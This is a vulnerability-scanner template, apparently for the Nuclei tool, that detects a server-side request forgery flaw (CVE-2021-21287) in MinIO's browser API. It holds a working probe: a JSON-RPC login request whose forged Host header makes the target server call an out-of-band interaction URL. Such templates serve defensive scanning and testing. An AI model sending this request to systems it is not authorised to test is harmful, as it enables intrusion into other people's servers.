id: CVE-2021-21287

info:
  name: MinIO Browser API SSRF
  author: pikpikcu
  severity: high
  description: MinIO is a High Performance Object Storage released under Apache License v2.0. In MinIO before version RELEASE.2021-01-30T00-20-58Z there is a server-side request forgery vulnerability.
  reference:
    - https://www.leavesongs.com/PENETRATION/the-collision-of-containers-and-the-cloud-pentesting-a-MinIO.html
    - https://nvd.nist.gov/vuln/detail/CVE-2021-21287
    - https://github.com/minio/minio/security/advisories/GHSA-m4qq-5f7c-693q
  tags: cve,cve2021,minio,ssrf,oob

requests:
  - method: POST
    path:
      - '{{BaseURL}}/minio/webrpc'
    body: |
      {"id":1,"jsonrpc":"2.0","params":{"token":  "Test"},"method":"web.LoginSTS"}

    headers:
      Host: {{interactsh-url}}
      Content-Type: application/json
      User-Agent: Mozilla/5.0

    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "http" # Confirms the HTTP Interaction
